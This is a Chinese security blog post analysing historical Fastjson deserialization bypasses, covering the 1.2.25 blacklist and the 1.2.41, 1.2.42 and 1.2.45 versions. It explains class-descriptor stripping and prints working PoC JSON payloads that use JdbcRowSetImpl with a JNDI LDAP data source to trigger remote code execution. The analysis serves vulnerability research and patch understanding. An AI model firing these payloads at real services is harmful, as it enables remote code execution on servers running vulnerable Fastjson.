---
title: Fastjson历史漏洞研究(一)
tags: web漏洞分析
categories: 技术
top_img: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg'
cover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/aed42176e4452c3808195c113a45ca8.jpg
date: 2020-09-15 17:46:54
---

本文衔接上一篇文章[《Fastjson 1.2.24反序列化漏洞深度分析》](http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/)，继续探讨一下FastJson的历史漏洞。

在《Fastjson 1.2.24反序列化漏洞深度分析》一文中，我们以Fastjson 1.2.24反序列化漏洞为基础，详细分析fastjson漏洞的一些细节问题。

Fastjson 1.2.24 版本的远程代码执行漏洞可谓是开辟了近几年来Fastjson漏洞的纪元。在Fastjson 1.2.24版本反序列化漏洞初次披露之后，官方针对这个漏洞进行了修补。然而这个修复方案很快就被发现存在绕过的风险。由于官方的修复方案或多或少都存在着一些问题，随之而来的是一次又一次的绕过与修复。

回顾一下Fastjson反序列化漏洞，简单来说就是：fastjson通过parse、parseObject处理以json结构传入的类的字符串形时，会默认调用该类的共有setter与构造函数，并在合适的触发条件下调用该类的getter方法。当传入的类中setter、getter方法中存在利用点时，攻击者就可以通过传入可控的类的成员变量进行攻击利用。com.sun.rowset.JdbcRowSetImpl这条利用链用到的是类中setter方法的缺陷，而TemplatesImpl利用链则用到的是getter方法缺陷。

官方主要的修复方案是引入了checkAutotype安全机制，通过黑白名单机制进行防御。在随后的版本中，为了增强漏洞绕过的难度，又在checkAutotype中采用了一定的加密混淆将本来明文存储的黑名单进行加密。

在简单的介绍完Fastjson 1.2.24版本远程代码执行漏洞后，我们来看一下官方是怎么修复这个漏洞的。

checkAutotype安全机制
---------------------

Fastjson从1.2.25开始引入了checkAutotype安全机制，通过黑名单+白名单机制来防御。我们先来看一下1.2.25版本初次引入的checkAutotype安全机制的形式，首先来看几个示例

1. 示例一

```java
package AutoTypeTest;

import com.alibaba.fastjson.JSON;

class ForTest{
    public  String s1;

    public String getS1() {
        return s1;
    }

    public void setS1(String s1) {
        this.s1 = s1;
    }
}
public class demo {
    public static void main(String[] args) {
        String jsonstr = "{\"@type\":\"AutoTypeTest.ForTest\",\"s1\":\"1\"}";
        Object obj = JSON.parseObject(jsonstr);
        System.out.println(obj);
    }
}
```

这是一个很普通的测试样例，用来将字符串转变为Java对象。执行结果如下

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3d7f965f988e8e297889dc6d75d8f4b6.png)

这个测试样例在1.2.24版本是可以执行成功的，但在1.2.25版本中却爆出来autoType is not support错误。

这是因为Fastjson 1.2.25版本引入了checkAutotype安全机制。在默认情况下AutoTypeSupport关闭且测试样例中的AutoTypeTest.ForTest类虽然不在黑名单上，但也并不在checkAutotype安全机制白名单上，因此使用上图测试样例在Fastjson 1.2.25版本中反序列化失败。

2. 示例二

在这个示例中，我们将AutoTypeSupport设置为true

```java
public class demo {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String jsonstr = "{\"@type\":\"AutoTypeTest.ForTest\",\"s1\":\"1\"}";
        Object obj = JSON.parseObject(jsonstr);
        System.out.println(obj);
    }
}
```

在开启AutoTypeSupport后，AutoTypeTest.ForTest类反序列化成功

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/81f432dbf98c947a76eab4f798339a02.png)

3. 示例三

这一次换成恶意类，再进行一次实验

```java
public class demo {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String jsonstr = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/ExecTest\"," + " \"autoCommit\":true}";
        Object obj = JSON.parseObject(jsonstr);
        System.out.println(obj);
    }
}
```

动态调试一下经过动态调试可以发现，程序在执行到com/alibaba/fastjson/parser/ParserConfig.java中checkAutoType安全机制时，com.sun.rowset.JdbcRowSetImpl类会触发黑名单，见下图

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/19d24d1278cfdd136f09593ad29112a1.png)

程序将抛出错误

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5a0becd8ef816df3112cd1d90d1c76aa.png)

我们来看一下Fastjson 1.2.25版本中引入的黑名单中元素都有哪些，见下图

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0cb5a1002338e425a9dffb00b927d908.png)

这次实验中的poc无法成功利用，是因为com.sun.rowset.JdbcRowSetImpl类命中了黑名单而不能反序列化成功。

在这里额外介绍一下：当程序经过黑白名单的校验之后，接下来会通过TypeUtils.loadClass方法对类进行反序列化加载

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b32c6fa1b3e8dde52ccf4b6b198dfea6.png)

TypeUtils.loadClass方法的实现比较有意思，下文要介绍的几处漏洞也与之有关。

Fastjson 1.2.41版本漏洞
-----------------------

1.2.41版本漏洞利用，其实就是针对1.2.24版本漏洞所打的补丁的绕过，本次漏洞影响了1.2.41版本以及之前的版本

首先来看一下1.2.41版本漏洞利用的poc

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/34dd52de7e3744ab73cae88e263aca0d.png)

可以发现，@type字段值为”Lcom.sun.rowset.JdbcRowSetImpl;”

在”com.sun.rowset.JdbcRowSetImpl”类的首尾多出了一个L与;

经过上文的介绍，我们知道@type字段值会经过黑名单校验

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0cb5a1002338e425a9dffb00b927d908.png)

黑名单的检测机制很简单，就是用黑名单中的元素依次与@type字段值进行字符串匹配，从@type字段值从首位开始，匹配到了黑名单中的元素，就会抛出错误。

很明显，”Lcom.sun.rowset.JdbcRowSetImpl;”并不会匹配到黑名单。但是有一个问题：黑名单匹配机制明显不管@type字段值末位是什么，又是为何在末位加一个”;”呢？首位的”L”又是什么呢？我们随后会介绍一下这个。

通过上文对checkAutotype安全机制的解释可以发现，@type字段值首先会经过黑白名单的校验。在成功通过校验之后，程序接下来会通过TypeUtils.loadClass方法对类进行加载

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b32c6fa1b3e8dde52ccf4b6b198dfea6.png)

让我们来跟入位于com/alibaba/fastjson/util/TypeUtils.java中的loadClass方法

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/905ad768dd7cc2540c00a101956694f1.png)

从上图可见，在该方法中有两次if语句，见上图红框处

从字面意义上来看，第一处的作用是匹配以”[”开头的字符串，而第二处则是匹配以”L”开头，以”;”结尾的字符串。

这一点看起来与poc中的结构很相似，poc中构造的结构应该就是为这里准备的。

我们接下来就来分析一下，”[”、 ”L”、”;”这些都是什么？以及为什么FastJson为什么要写两处if逻辑来处理他们。

### JNI字段描述符

首先我们来思考一个题外话，如何获取一个类的数组类型的Class对象？ 可参考下面demo

```java
package AutoTypeTest;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import java.lang.reflect.Array;

class ForTest{


    public  String s1;

    public ForTest(){
        this.s1 ="1" ;

    }

    public String getS1() {
        return s1;
    }

    public void setS1(String s1) {
        this.s1 = s1;
    }

}
public class demo {
    public static void main(String[] args) throws ClassNotFoundException {


        //方法一
        ForTest[] ar = new ForTest[1];
        Class<?> clazz1 =  ar.getClass();

        //方法二
        Class<?> clazz2 = Array.newInstance(ForTest.class, 0).getClass();

        //方法三
        Class clazz3 = Class.forName("[LAutoTypeTest.ForTest;");
```

上述demo中三种方式都可以获取一个类的数组类型的Class对象

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b9770b8f656ab3a4ebbb42e9f82e3406.png)

通过调试结果可见，clazz1、clazz2、clazz3的name是一样的，都为字符串”[LAutoTypeTest.ForTest;”。

”[LAutoTypeTest.ForTest;”这种形式的字符串其实是一种对函数返回值和参数的编码，名为JNI字段描述符（JavaNative Interface FieldDescriptors)。

AutoTypeTest.ForTest类的Class对象名为”AutoTypeTest.ForTest”；为了区分，AutoTypeTest.ForTest类的数组类型的Class对象名则为”[LAutoTypeTest.ForTest;”这样的形式。其中首个字符”[”用以表示数组的层数，而第二个字符则代表数组的类型。

这里举例说明一下JNI字段描述符的格式：

- double\[\]\[\]对应的类对象名为"[[D"

- int[]对应的类对象名则为"[I"

- AutoTypeTest.ForTest[]对应的类对象名则为"[LAutoTypeTest.ForTest;"

前两者比较好理解，而第三个”[LAutoTypeTest.ForTest;”，可见第二个字符是”L”,且最后一个字符是”;”。这种形式叫类描述符，”L”与”;”之间的字符串表示着该类对象的所属类（AutoTypeTest.ForTest）。这就是为什么FastJson中要有下图这样的两处if逻辑，实际上是用来解析传入的数组类型的Class对象字符串

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a5cecd42324d592731c44d90c8c21f5b.png)

### 漏洞利用

经过我们上文的分析，已经对漏洞以及构造有了一定的了解。接下来重点来看下FastJson解析类描述符的代码，见下图：

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/e02029eade7ee2d5a534ee7961eec2c2.png)

从上图代码不难看出，当传入的类名以”L”开头，且以”;”结尾时，程序将去除首尾后返回。这意味着，如果在恶意类前后加上”L”与”;”，例如”LAutoTypeTest.ForTest;”，这样不仅可以轻易的躲避黑名单，随后在程序执行到这里时，还会将首尾附加的”L”与”;”剥去。剥皮处理之后字符串变成”AutoTypeTest.ForTest”，接着”AutoTypeTest.ForTest”被loadClass加载，恶意类被成功反序列化利用。我们构造一个如下图的poc，测验以下我们的判断是否是否正确：

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/34dd52de7e3744ab73cae88e263aca0d.png)

经过动态调试后发现，程序的确进入如下if分支，并且剥去前后”L”与”;”

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/204f15e90a91f18369ab74875437598c.png)

我们构造的poc执行成功。在poc执行成功后，计算器顺利的弹出

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/02c17ac61b4f3029ea2fa0635bbc2548.png)

上述漏洞在Fastjson 1.2.42版本中被修复，从Fastjson 1.2.42版本发布的升级说明中可以看到这点

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/16b8d1899466896e9a2c642d0638a120.png)

Fastjson 1.2.42版本漏洞
-----------------------

Fastjson 1.2.42版本在处理了1.2.41版本的漏洞后。很快又被发现存在着绕过方式。我们接下来分析下Fastjson 1.2.42中的checkAutotype安全机制，看看Fastjson 1.2.42的更新是怎么处理1.2.41版本漏洞的。

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/127e8ce129efb319c1a03119f550f8dc.png)

从上图可以发现，不同于之前的版本，程序并不是直接通过明文的方式来匹配黑白名单，而是采用了一定的加密混淆。此时的黑名单也变成如下的样子

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f796a6f9ed3d05d3f7f4e41c4df4a283.png)

针对这里的黑名单的原文明文也是有人曾经研究过的，可以参考如下链接

https://github.com/LeadroyaL/fastjson-blacklist

除了引入了黑名单加密混淆机制外，checkAutotype中也加入了一些新的机制，如下图这里

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b8159ba031debf45a5a98c088f859ea8.png)

与之前的版本相比，这里多出了上图这一段代码。从代码上大体可以猜测出来，这是用来判断类名的第一个字符与最后一个字符是否满足一定条件，然后将首尾剥去。这里又看到熟悉的剥皮操作了，我们不难猜测到这两个满足条件的字符大概率是”L”与”;”。开发者的用意大概是想针对于1.2.41版本的利用”Lcom.sun.rowset.JdbcRowSetImpl;”，先剥去传入类名首尾的”L”与”;”，以便将恶意数据暴露出来，再经过黑名单校验。

我们写个小测试，看看这俩字符是不是”L”与”;”

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0a1d4125f31b560b3d2cfcddd0bcbaf9.png)

实践证明，FastJson这里要去除的还真是首尾的”L”与”;”

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6298aa075e5553217bd7f5042c484f3e.png)

### 漏洞利用

因为这里很容易猜出怎么绕过，因此我们先不贴poc，一步步分析下执行流程最终构造处正确的poc。

首先程序进入checkAutoType后，进入如下两个if分支进行处理

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ac1453b99590452916dd6336ef14c1ba.png)

第一个if分支，是用来限制传入的类名长度的，这里只要我们传入的poc中类名长度在3与128之间即可。而第二个分支，我们上文已经分析过了，目的是剥去类名中的首尾”L”与”;”。因此构造如下poc即可轻易绕过FastJson1.2.42版本

```java
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String jsonstr = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:1389/ExecTest\"," + " \"autoCommit\":true}";
        Object obj = JSON.parseObject(jsonstr);
        System.out.println(obj);
```

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d1f0ba0089fc7f64635cbd52afe5350c.png)

Fastjson 1.2.45版本漏洞
-----------------------

在Fastjson 1.2.45版本中，checkAutotype安全机制又被发现了一种绕过方式。之前的几次绕过都是针对checkAutoType的绕过，而这次则是利用了一条黑名单中不包含的元素，从而绕过了黑名单限制。

本次绕过利用到的是mybatis库。如果想测试成功，需要额外安装mybatis库。下文测试用例中安装的版本是3.5.5。

首先简单介绍下mybatis，maven上的简介如下：

> “MyBatis SQL映射器框架使将关系数据库与面向对象的应用程序结合使用变得更加容易。MyBatis使用XML描述符或注释将对象与存储过程或SQL语句耦合。相对于对象关系映射工具，简单性是MyBatis数据映射器的最大优势。”

### 漏洞利用

本次利用poc如下图

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/23689542db1576061ec011f3d10ca794.png)

从poc中不难发现，@type指定了JndiDataSourceFactory类，而在properties属性中的data_source变量中指定恶意数据源。由于JndiDataSourceFactory并不在黑名单上，因此可以顺利通过黑名单校验，在接下来的反序列化过程中，在为Properties变量赋值时调用其setter方法，可见下图动态调试结果

![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8bf6a23d27b5eca427263eee78bb4b71.png)

在上图setProperties方法中，程序将取出poc中构造的DATA_SOURCE值并触发漏洞

写在最后
--------

除了上文分析的漏洞之外，FastJson还有几个很精彩的漏洞，例如Fastjson 1.2.47版本和1.2.68版本的漏洞。因为篇幅有限，要写的实在太多了，因此我把它们抽出来放在后续文章中介绍。